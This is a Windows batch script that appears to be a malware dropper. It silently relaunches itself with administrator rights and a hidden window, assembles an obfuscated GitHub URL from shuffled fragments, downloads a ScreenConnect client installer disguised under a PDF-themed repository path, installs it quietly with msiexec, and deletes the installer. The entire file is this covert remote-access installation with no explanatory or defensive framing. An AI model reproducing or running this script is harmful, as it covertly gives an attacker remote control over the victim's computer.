@echo off
setlocal EnableDelayedExpansion

if "%~1"=="HIDDEN" goto :INSTALL

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { Start-Process cmd -ArgumentList '/c','\"%~f0\" HIDDEN' -Verb RunAs -WindowStyle Hidden }"
exit

:INSTALL
set "vdls[0]=.msi"
set "vdls[1]=github"
set "vdls[2]=Screen"
set "vdls[3]=Connect"
set "vdls[4]=.Client"
set "vdls[5]=Setup"
set "vdls[6]=.msi"
set "vdls[7]=/main/"
set "vdls[8]=raw/"
set "vdls[9]=refs/heads"
set "vdls[10]=/adbmsi/"
set "vdls[11]=/clintdirctpdf"
set "vdls[12]=https"
set "vdls[13]=://"
set "vdls[14]=.com"
set "vdls[15]=github"
set "vdls[16]=/"

set "imlg=!vdls[12]!!vdls[13]!!vdls[15]!!vdls[14]!!vdls[16]!!vdls[11]!!vdls[10]!!vdls[8]!!vdls[9]!!vdls[7]!!vdls[2]!!vdls[3]!!vdls[4]!!vdls[5]!!vdls[0]!"

set "FILE=%TEMP%\ScreenConnect.ClientSetup.msi"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '!imlg!' -OutFile '%FILE%' -UseBasicParsing } catch {}"
start "" /wait /b msiexec /i "%FILE%" /quiet /qn /norestart
del "%FILE%" /f /q >nul 2>&1
exit